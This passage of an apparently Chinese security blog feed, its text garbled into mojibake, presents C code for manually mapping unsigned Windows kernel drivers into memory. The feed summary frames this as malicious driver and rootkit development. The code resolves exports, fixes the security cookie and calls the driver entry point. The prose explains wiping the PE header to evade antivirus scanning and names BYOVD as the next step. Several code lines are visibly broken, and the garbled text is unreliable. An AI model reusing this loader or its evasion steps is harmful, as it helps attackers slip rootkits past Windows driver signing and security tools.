class="comment">//moduleNameç¤ºä¾‹ï¼šâ€Win.dllâ€œ</span></span><br><span class="line">ULONG_PTR <span class="title function_">QueryModule</span><span class="params">(PUCHAR moduleName, ULONG_PTR* moduleSize)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (moduleName == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">RTL_PROCESS_MODULES rtlModule = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">PRTL_PROCESS_MODULES SystemModules = &amp;rtlModule;</span><br><span class="line"><span class="comment">//æ˜¯å¦å¼€è¾Ÿå†…å­˜äº†ï¼Œé»˜è®¤ä¸ºæ²¡å¼€è¾Ÿå†…å­˜</span></span><br><span class="line">BOOLEAN isAlloc = FALSE;</span><br><span class="line"><span class="comment">//æµ‹é‡é•¿åº¦ï¼Œç¡®è®¤ä¸€ä¸‹éœ€è¦å¤šå°‘å†…å­˜æ¥å­˜æ”¾æˆ‘ä»¬æŸ¥è¯¢å‡ºæ¥çš„ç»“æœ</span></span><br><span class="line">ULONG* retLength = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//æŸ¥è¯¢ï¼Œè¿™ä¸€æ¬¡æŸ¥è¯¢ä¸»è¦æ˜¯ä¸ºäº†ç¡®è®¤æˆ‘ä»¬éœ€è¦ç”³è¯·å¤šå°‘å†…å­˜å­˜æ”¾ç»“æœ</span></span><br><span class="line">NTSTATUS status = ZwQuerySystemInformation(SystemModuleInformation, SystemModules, <span class="keyword">sizeof</span>(RTL_PROCESS_MODULES), &amp;retLength);</span><br><span class="line"><span class="comment">//å¦‚æœè¿”å›å€¼æ˜¯å¤§å°ä¸åŒ¹é…ï¼Œä¹Ÿå°±æ˜¯ä»£è¡¨ç€æˆ‘ä»¬ç»™çš„ç»“æ„ä½“å°äº†ï¼Œé‚£ä¹ˆå°±ä¼šåœ¨retLengthå‚æ•°ä¸­è¿”å›å®é™…éœ€è¦çš„å¤§å°</span></span><br><span class="line"><span class="comment">//åˆ†é…å®é™…å¤§å°çš„å†…å­˜ï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢æœ€ç»ˆè¿”å›çš„retLength</span></span><br><span class="line"><span class="keyword">if</span> (status == STATUS_INFO_LENGTH_MISMATCH)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//ç”³è¯·å†…å­˜ï¼Œä¸éœ€è¦æ‰§è¡Œ,å¤§å°æ‹¿è¿”å›å‡ºæ¥çš„æ­£ç¡®å¤§å°+ç»“æ„å¤§å°</span></span><br><span class="line">SystemModules = ExAllocatePool(PagedPool, retLength + <span class="keyword">sizeof</span>(RTL_PROCESS_MODULES));</span><br><span class="line"><span class="comment">//å¦‚æœç”³è¯·å¤±è´¥</span></span><br><span class="line"><span class="keyword">if</span> (!SystemModules) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="comment">//ç”³è¯·æˆåŠŸçš„è¯è¿›è¡Œåˆå§‹åŒ–</span></span><br><span class="line"><span class="built_in">memset</span>(SystemModules, <span class="number">0</span>, retLength + <span class="keyword">sizeof</span>(RTL_PROCESS_MODULES));</span><br><span class="line"></span><br><span class="line"><span class="comment">//å†æŸ¥ä¸€æ¬¡,è¿™å›æä¾›æ­£ç¡®çš„å¤§å°(æ¨¡å—æ€»é•¿åº¦)</span></span><br><span class="line">NTSTATUS status = ZwQuerySystemInformation(SystemModuleInformation, SystemModules, retLength + <span class="keyword">sizeof</span>(RTL_PROCESS_MODULES), &amp;retLength);</span><br><span class="line"><span class="comment">//å¦‚æœè¿˜ä¸æˆåŠŸï¼Œé‚£å°±é‡Šæ”¾å†…å­˜</span></span><br><span class="line"><span class="keyword">if</span> (!NT_SUCCESS(status))</span><br><span class="line">&#123;</span><br><span class="line">ExFreePool(SystemModules);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//è¯æ˜å†…å­˜ç”³è¯·äº†</span></span><br><span class="line">isAlloc = TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">ç”±äºæˆ‘ä»¬æ¥ä¸‹æ¥ä¼šæœ‰æ¯”è¾ƒï¼Œä½†æ˜¯æˆ‘ä»¬ä¼ è¿›æ¥çš„ä¸æ˜¯å®Œæ•´è·¯å¾„åªæœ‰ä¸€ä¸ªåå­—çš„æ¨¡å—åå­—ï¼Œå’Œéå†è·å¾—çš„æ¨¡å—å…¨è·¯å¾„ä½œæ¯”è¾ƒ</span></span><br><span class="line"><span class="comment">æ‰€ä»¥æˆ‘ä»¬åªèƒ½é€šè¿‡æ˜¯å¦åŒ…å«æ¥ç¡®å®šæ˜¯å¦ä¸€è‡´ï¼Œè€Œè¿™è¦æ±‚2è€…éƒ½æ˜¯å¤§å†™</span></span><br><span class="line"><span class="comment">ä½†æ˜¯ç”±äºæˆ‘ä»¬ä¼ è¿›æ¥çš„`moduleName`æ˜¯ä¸€ä¸ªå¸¸é‡ï¼Œæ­£å¸¸æƒ…å†µä¸‹æ— æ³•ä¿®æ”¹ï¼Œæ‰€ä»¥è¿™é‡Œé‡‡ç”¨åˆ›å»ºå†…å­˜ç„¶åæ‹·è´çš„æ–¹æ³•ä¿®æ”¹</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//å­˜æ”¾æˆ‘ä»¬è½¬æ¢æˆå¤§å†™çš„ä¼ è¿›æ¥çš„æ¨¡å—å</span></span><br><span class="line">PUCHAR KernelModuleName = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ç”¨æ¥å­˜æ”¾æ‰¾åˆ°çš„æ¨¡å—çš„åŸºå€</span></span><br><span class="line">ULONG_PTR moduleBase = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//è¿™é‡Œä½¿ç”¨do-whileç»“æ„ä¸»è¦æ˜¯ä¸ºäº†æ–¹ä¾¿å½“æˆ‘ä»¬æƒ³è·å–ntoskrn.exeæ¨¡å—çš„æ—¶å€™å¯ä»¥è·å–åˆ°åç›´æ¥breakå‡ºå»ç„¶åé‡Šæ”¾å†…å­˜</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//åœ¨32ä½çš„29912åˆ†é¡µä¸‹ï¼Œä¼šæœ‰ä¸¤ä¸ªå†…æ ¸ï¼Œä¹Ÿå°±æ˜¯ä¼šæœ‰ä¸¤ä¸ª`ntoskrn.exe`å†…æ ¸æ¨¡å—</span></span><br><span class="line"><span class="keyword">if</span> (_stricmp(moduleName, <span class="string">&quot;ntoskrnl.exe&quot;</span>) == <span class="number">0</span> || _stricmp(moduleName, <span class="string">&quot;ntkrnlpa.exe&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//å°†å½“å‰ç¬¬ä¸€ä¸ªæ¨¡å—å­˜å‚¨åœ¨ModuleInfoä¸­,å†…æ ¸æ¨¡å—æ°¸è¿œæ˜¯ç¬¬ä¸€ä¸ª</span></span><br><span class="line">PRTL_PROCESS_MODULE_INFORMATION ModuleInfo = &amp;SystemModules-&gt;Modules[<span class="number">0</span>];</span><br><span class="line"><span class="comment">//æ ¹æ®ModuleInfoè·å–æ¨¡å—åŸºåœ°å€</span></span><br><span class="line">moduleBase = ModuleInfo-&gt;ImageBase;</span><br><span class="line"><span class="comment">//å¦‚æœæˆ‘ä»¬ä¼ è¿›æ¥çš„moduleSizeä¸ä¸ºç©ºï¼Œé‚£ä¹ˆä¹Ÿå°†sizeè¿”å›</span></span><br><span class="line"><span class="keyword">if</span> (moduleSize) *moduleSize = ModuleInfo-&gt;ImageSize;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æˆ‘ä»¬ä¼ è¿›æ¥çš„ModuleNameè½¬å¤§å†™åçš„ç»“æœã€‚</span></span><br><span class="line"><span class="comment">//å¤åˆ¶ä¸€å—å†…å­˜ï¼Œç”¨æ¥å°†ä¼ è¿›æ¥çš„å¸¸é‡`FullPathName`è½¬å¤§å†™,+1ä¼šæ­£å¥½æœ‰ä¸€ä¸ª0ç»“å°¾</span></span><br><span class="line">KernelModuleName = ExAllocatePool(PagedPool, <span class="built_in">strlen</span>(moduleName) + <span class="number">1</span>);</span><br><span class="line"><span class="comment">//åˆå§‹åŒ–å†…å­˜</span></span><br><span class="line"><span class="built_in">memset</span>(KernelModuleName, <span class="number">0</span>, <span class="built_in">strlen</span>(moduleName) + <span class="number">1</span>);</span><br><span class="line"><span class="comment">//å¤åˆ¶,å°†æˆ‘ä»¬ä¼ è¿›æ¥çš„å¸¸é‡`moduleName`æ‹·è´åˆ°æˆ‘ä»¬ç”³è¯·å‡ºæ¥çš„KernelModuleNameé‡Œé¢</span></span><br><span class="line"><span class="built_in">memcpy</span>(KernelModuleName, moduleName, <span class="built_in">strlen</span>(moduleName));</span><br><span class="line"><span class="comment">//å°†åå­—è½¬å¤§å†™</span></span><br><span class="line">_strupr(KernelModuleName);</span><br><span class="line"><span class="comment">//æ ¹æ®æ¨¡å—çš„æ•°é‡éå†</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SystemModules-&gt;NumberOfModules; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//å°†å½“å‰éå†åˆ°çš„æ¨¡å—å­˜å‚¨åœ¨ModuleInfoä¸­</span></span><br><span class="line">PRTL_PROCESS_MODULE_INFORMATION ModuleInfo = &amp;SystemModules-&gt;Modules[i];</span><br><span class="line"><span class="comment">//åšæµ‹è¯•ï¼Œæ‰“å°æ‰€æœ‰æ¨¡å—</span></span><br><span class="line"><span class="comment">//DbgBreakPoint();</span></span><br><span class="line">DbgPrint(<span class="string">&quot;baseName = %s;FullPath = %s\r\n&quot;</span>, ModuleInfo-&gt;FullPathName + ModuleInfo-&gt;OffsetToFileName, ModuleInfo-&gt;FullPathName);</span><br><span class="line"><span class="comment">//å°†FullPathNameè½¬æ¢ä¸ºå¤§å†™,è¿™é‡Œè·å¾—çš„æ˜¯å…¨è·¯å¾„</span></span><br><span class="line">PUCHAR pathName = _strupr(ModuleInfo-&gt;FullPathName);</span><br><span class="line"><span class="comment">//å¦‚æœæ‰¾åˆ°äº†ï¼ˆæˆ‘ä»¬ä¼ è¿›æ¥çš„ä¸å®Œæ•´åå­—è¢«å…¨è·¯å¾„åŒ…å«äº†ï¼‰</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strstr</span>(pathName, KernelModuleName))</span><br><span class="line">&#123;</span><br><span class="line">moduleBase = ModuleInfo-&gt;ImageBase;</span><br><span class="line"><span class="comment">//å¦‚æœæˆ‘ä»¬ä¼ è¿›æ¥çš„moduleSizeä¸ä¸ºç©ºï¼Œé‚£ä¹ˆä¹Ÿå°†sizeè¿”å›</span></span><br><span class="line"><span class="keyword">if</span> (moduleSize) *moduleSize = ModuleInfo-&gt;ImageSize;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//å¦‚æœä¸ä¸ºç©ºï¼Œé‚£ä¹ˆé‡Šæ”¾</span></span><br><span class="line"><span class="keyword">if</span> (KernelModuleName)</span><br><span class="line">&#123;</span><br><span class="line">ExFreePool(KernelModuleName);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//æ ¹æ®æˆ‘ä»¬å®šçš„æ ‡å¿—ï¼Œåˆ¤æ–­æˆ‘ä»¬æ˜¯å¦ç”³è¯·äº†å†…å­˜ï¼Œå¦‚æœç”³è¯·äº†ï¼Œè¿›è¡Œé‡Šæ”¾</span></span><br><span class="line"><span class="keyword">if</span> (isAlloc)</span><br><span class="line">&#123;</span><br><span class="line">ExFreePool(SystemModules);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//å°†æˆ‘ä»¬å¾—åˆ°çš„æŒ‡å®šçš„æ¨¡å—åŸºå€è¿”å›</span></span><br><span class="line"><span class="keyword">return</span> moduleBase;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//æ ¹æ®å‡½æ•°åæ‰¾åˆ°å¯¹åº”çš„åœ°å€ï¼Œåœ¨win7ä¸‹RtlFindExportedRoutineByNameä¸å¯ä»¥ä½¿ç”¨ï¼Œæ‰€ä»¥éœ€è¦é‡å†™</span></span><br><span class="line">ULONG64 <span class="title function_">ExportTableFuncByName</span><span class="params">(<span class="type">char</span>* pData, <span class="type">char</span>* funcName)</span></span><br><span class="line">&#123;</span><br><span class="line">PIMAGE_DOS_HEADER pHead = (PIMAGE_DOS_HEADER)pData;</span><br><span class="line">PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pData + pHead-&gt;e_lfanew);</span><br><span class="line"><span class="type">int</span> numberRvaAndSize = pNt-&gt;OptionalHeader.NumberOfRvaAndSizes;</span><br><span class="line">PIMAGE_DATA_DIRECTORY pDir = (PIMAGE_DATA_DIRECTORY)&amp;pNt-&gt;OptionalHeader.DataDirectory[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(pData + pDir-&gt;VirtualAddress);</span><br><span class="line"></span><br><span class="line">ULONG64 funcAddr = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; pExport-&gt;NumberOfNames; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span>* funcAddress = pData + pExport-&gt;AddressOfFunctions;</span><br><span class="line"><span class="type">int</span>* names = pData + pExport-&gt;AddressOfNames;</span><br><span class="line"><span class="type">short</span>* fh = pData + pExport-&gt;AddressOfNameOrdinals;</span><br><span class="line"><span class="type">int</span> index = <span class="number">-1</span>;</span><br><span class="line"><span class="type">char</span>* name = pData + names[i];</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(name, funcName) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">index = fh[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (index != <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">funcAddr = pData + funcAddress[index];</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!funcAddr)</span><br><span class="line">&#123;</span><br><span class="line">KdPrint((<span class="string">&quot;æ²¡æœ‰æ‰¾åˆ°å‡½æ•°%s\r\n&quot;</span>, funcName));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">KdPrint((<span class="string">&quot;æ‰¾åˆ°å‡½æ•°%s addr %p\r\n&quot;</span>, funcName, funcAddr));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> funcAddr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç”±äºæœ¬äººçš„ç²¾åŠ›å¤§éƒ¨åˆ†ä¸åœ¨è¿™ä¸ªéƒ¨åˆ†ï¼Œæ‰€ä»¥åªæ”¾å‡ºä»£ç ï¼Œå…¶å®å¾ˆç®€å•ï¼Œä»”ç»†çœ‹ä»£ç å³å¯ã€‚å°±æ˜¯ç¨‹åºéœ€è¦ä½¿ç”¨åˆ«äººçš„å‡½æ•°ï¼Œéƒ½æ”¾åœ¨å¯¼å…¥è¡¨é‡Œï¼Œç°åœ¨æˆ‘ä»¬è¦æŠŠç¨‹åºæ”¾åˆ°å†…å­˜é‡Œï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±è¦ç»™ä»–æŠŠå¯¼å…¥è¡¨é‡Œé¢å‡½æ•°çš„åœ°å€éƒ½æ‰¾åˆ°äº†ï¼Œä¸Šé¢ä¿®å¤é‡å®šä½ä¹Ÿæ˜¯ä¸€ä¸ªé“ç†ï¼Œå°±æ˜¯æœ¬æ¥æ˜¯Windowsæ“ä½œç³»ç»Ÿä¸ºæˆ‘ä»¬åšçš„äº‹æƒ…ï¼Œç°åœ¨æˆ‘ä»¬å†…å­˜åŠ è½½è¦è‡ªå·±å®ç°ã€‚</p><h2 id="ä¿®å¤cookie"><a href="#ä¿®å¤cookie" class="headerlink" title="ä¿®å¤cookie"></a>ä¿®å¤cookie</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ä¿®å¤cookie</span></span><br><span class="line">VOID <span class="title function_">UpdataCookie</span><span class="params">(<span class="type">char</span>* ImageBuffer)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//DbgBreakPoint();</span></span><br><span class="line"><span class="keyword">if</span> (!ImageBuffer) <span class="keyword">return</span> FALSE;</span><br><span class="line"><span class="comment">//è·å–PEçš„NTå¤´ï¼Œè¿™é‡Œä½¿ç”¨æœªæ–‡æ¡£åŒ–çš„å‡½æ•°è¿›è¡Œè·å–</span></span><br><span class="line">PIMAGE_NT_HEADERS pNts = RtlImageNtHeader(ImageBuffer);</span><br><span class="line"><span class="comment">//å¦‚æœæ²¡æœ‰è·å–åˆ°ï¼Œè¿”å›FALSE</span></span><br><span class="line"><span class="keyword">if</span> (!pNts) <span class="keyword">return</span> FALSE;</span><br><span class="line"><span class="comment">//ç¬¬åå·(IMAGE_DIRECTORY_ENTRY_BASERELOC)å°±æ˜¯cookie</span></span><br><span class="line">PIMAGE_DATA_DIRECTORY pConfigDir = &amp;pNts-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG];</span><br><span class="line"><span class="comment">//imagebuffer +offset  = configä½ç½®</span></span><br><span class="line">PIMAGE_LOAD_CONFIG_DIRECTORY config = (PIMAGE_LOAD_CONFIG_DIRECTORY)(ImageBuffer + pConfigDir-&gt;VirtualAddress);</span><br><span class="line"><span class="comment">//COOKIE éšä¾¿ä¸€ä¸ªå€¼å°±è¡Œåªè¦ä¸æ˜¯å±é™©å€¼ï¼Œå…·ä½“å°±çœ‹ç†è®ºç¯‡æœ‰æåˆ°cookieçš„é€»è¾‘</span></span><br><span class="line">*(PULONG_PTR)(config-&gt;SecurityCookie) += <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="è·å–å…¥å£ç‚¹-call-å…¥å£ç‚¹"><a href="#è·å–å…¥å£ç‚¹-call-å…¥å£ç‚¹" class="headerlink" title="è·å–å…¥å£ç‚¹+call å…¥å£ç‚¹"></a>è·å–å…¥å£ç‚¹+call å…¥å£ç‚¹</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//åŠ è½½é©±åŠ¨</span></span><br><span class="line">BOOLEAN <span class="title function_">LoadDriver</span><span class="params">(PUCHAR FileBuffer)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//1.å…ˆæ‹‰ä¼¸ï¼Œä¿®å¤PEå¤´ï¼Œè·å–PEåŸºå€</span></span><br><span class="line">PUCHAR imageBase = FileToImange(FileBuffer);</span><br><span class="line"><span class="comment">//æ‹‰ä¼¸å¤±è´¥è¿”å›FALSE</span></span><br><span class="line"><span class="keyword">if</span> (!imageBase) <span class="keyword">return</span> FALSE;</span><br><span class="line"><span class="comment">//æ ‡å¿—ä½</span></span><br><span class="line">BOOLEAN isSucess = FALSE;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//2.æ ¹æ®PEåŸºå€ä¿®å¤é‡å®šä½</span></span><br><span class="line">isSucess = UpdataRelocation(imageBase);</span><br><span class="line"><span class="comment">//å¤±è´¥é‡Šæ”¾å†…å­˜</span></span><br><span class="line"><span class="keyword">if</span> (!isSucess) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//3.æ ¹æ®PEåŸºå€ä¿®å¤IATè¡¨</span></span><br><span class="line">isSucess = UpdataIAT(imageBase);</span><br><span class="line"><span class="comment">//å¤±è´¥é‡Šæ”¾å†…å­˜</span></span><br><span class="line"><span class="keyword">if</span> (!isSucess) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//4.ä¿®å¤cookieï¼ˆWin732ä½ä¸‹å¯ä»¥ä¸ä¿®ï¼‰</span></span><br><span class="line">UpdataCookie(imageBase);</span><br><span class="line"></span><br><span class="line"><span class="comment">//call å…¥å£ç‚¹</span></span><br><span class="line"><span class="comment">//è·å–PEçš„NTå¤´ï¼Œè¿™é‡Œä½¿ç”¨æœªæ–‡æ¡£åŒ–çš„å‡½æ•°è¿›è¡Œè·å–</span></span><br><span class="line">PIMAGE_NT_HEADERS pNts = RtlImageNtHeader(imageBase);</span><br><span class="line"><span class="comment">//5.è·å–å…¥å£ç‚¹</span></span><br><span class="line">ULONG_PTR entry = pNts-&gt;OptionalHeader.AddressOfEntryPoint;</span><br><span class="line"><span class="comment">//å®šä¹‰ä¸€ä¸ªå‡½æ•°å…¥å£ç‚¹çš„ä½ç½®(è®¾ç½®è¿™ä¸ªå‡½æ•°çš„åœ°å€)</span></span><br><span class="line">DriverEntrypProc EntryPoint = (DriverEntrypProc)(imageBase + entry);</span><br><span class="line"><span class="comment">//6.call å…¥å£ç‚¹</span></span><br><span class="line"><span class="comment">//DbgBreakPoint();</span></span><br><span class="line">NTSTATUS status = EntryPoint(<span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (!NT_SUCCESS(status))</span><br><span class="line">&#123;</span><br><span class="line">isSucess = FALSE;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//å°†PEå¤´å»æ‰</span></span><br><span class="line"><span class="built_in">memset</span>(imageBase, <span class="number">0</span>, PAGE_SIZE);</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!isSucess)</span><br><span class="line">&#123;</span><br><span class="line">ExFreePool(imageBase);</span><br><span class="line"><span class="keyword">return</span> isSucess;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> isSucess;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ³¨æ„æœ€ä¸‹é¢æœ‰ä¸€ä¸ªæ“¦å»PEå¤´çš„æ“ä½œï¼Œå› ä¸ºPEå¤´çš„ä½¿å‘½å·²å®Œæˆï¼Œå»æ‰è¿™éƒ¨åˆ†å¯ä»¥å‡å°‘æ€æ¯’é™æ€æ‰«æå†…å­˜çš„ç‰¹å¾ï¼Œé©±åŠ¨ä»£ç å’Œæ•°æ®å·²æŒ‰PEå¤´çš„æè¿°æ­£ç¡®åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œåç»­æ‰§è¡Œå®Œå…¨ä¾èµ–å†…å­˜ä¸­çš„ä»£ç é€»è¾‘ï¼Œä¸å†è¯»å–PEå¤´ä¿¡æ¯ã€‚</p><p>å¤§æ¦‚å°±æ˜¯è¿™ä¹ˆä¸€ä¸ªæ“ä½œï¼Œå¤§éƒ¨åˆ†å‚è€ƒçš„å¦‚ä¸‹ä»£ç ï¼Œæ•´ç†å¥½æˆ‘æ”¾ç½‘ç›˜äº†ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250830025601477.png" alt="image-20250830025601477"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250830030240810.png" alt="image-20250830030240810"></p><h2 id="æµ‹è¯•"><a href="#æµ‹è¯•" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h2><h3 id="æ­£å¸¸åŠ è½½"><a href="#æ­£å¸¸åŠ è½½" class="headerlink" title="æ­£å¸¸åŠ è½½"></a>æ­£å¸¸åŠ è½½</h3><p>ä¸æˆåŠŸ</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250830031250712.png" alt="image-20250830031250712"></p><h3 id="é©±åŠ¨å†…å­˜åŠ è½½"><a href="#é©±åŠ¨å†…å­˜åŠ è½½" class="headerlink" title="é©±åŠ¨å†…å­˜åŠ è½½"></a>é©±åŠ¨å†…å­˜åŠ è½½</h3><p>åŒæ ·æ˜¯æ²¡æœ‰æµ‹è¯•ç¯å¢ƒä¸‹çš„ï¼Œç”¨ç¼–è¯‘çš„é©±åŠ¨åŠ è½½é©±åŠ¨è¿˜æ˜¯ä¸è¡Œçš„ï¼Œå“ˆå“ˆå“ˆå“ˆã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250830031716271.png" alt="image-20250830031716271"></p><p>æµ‹è¯•ç¯å¢ƒä¸‹æ²¡æ¯›ç—…å•Šï¼Œæ‰€ä»¥ä¸‹ä¸€æ­¥æˆ‘ä»¬è¦åšçš„å°±æ˜¯ï¼Œæ€ä¹ˆä¸åœ¨æµ‹è¯•ç¯å¢ƒä¸‹ï¼Œä¹Ÿå°±æ˜¯è¦ç”¨åˆ°BYOVDæŠ€æœ¯äº†ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250830031902902.png" alt="image-20250830031902902"></p><h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p><a href="https://www.cnblogs.com/murkuo/p/18199526">https://www.cnblogs.com/murkuo/p/18199526</a></p><p><a href="https://www.cnblogs.com/murkuo/p/18199524">https://www.cnblogs.com/murkuo/p/18199524</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;åœ¨åšæ¶æ„é©±åŠ¨å¼€å‘çš„æ—¶å€™ï¼Œæƒ³è¦rootkitï¼Œæœ€é‡è¦çš„é—®é¢˜å°±æ˜¯é©±åŠ¨èƒ½ä¸èƒ½åŠ è½½è¿›å»ï¼Œé©±åŠ¨å¼€å‘å¥½äº†ï¼Œæ²¡æœ‰ç­¾åæ— æ³•åŠ è½½ä½¿ç”¨ä¹Ÿæ˜¯æ²¡ç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨</summary>
      
    
    
    
    <category term="Windows Kernelå®‰å…¨ç ”ç©¶" scheme="https://250wuyifan.github.io/categories/Windows-Kernel%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"/>
    
    
    <category term="Windows Kernelå®‰å…¨ç ”ç©¶" scheme="https://250wuyifan.github.io/tags/Windows-Kernel%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"/>
    
  </entry>
  
  <entry>
    <title>åˆ¶ä½œä¸€ä¸ªWindows x64 Kernel Rootkit</title>
    <link href="https://250wuyifan.github.io/2025/08/28/%E5%88%B6%E4%BD%9C%E4%B8%80%E4%B8%AAWindows-x64-Kernel-Rootkit/"/>
    <id>https://250wuyifan.github.io/2025/08/28/%E5%88%B6%E4%BD%9C%E4%B8%80%E4%B8%AAWindows-x64-Kernel-Rootkit/</id>
    <published>2025-08-28T10:45:14.000Z</published>
    <updated>2025-08-30T09:28:12.000Z</updated>
    
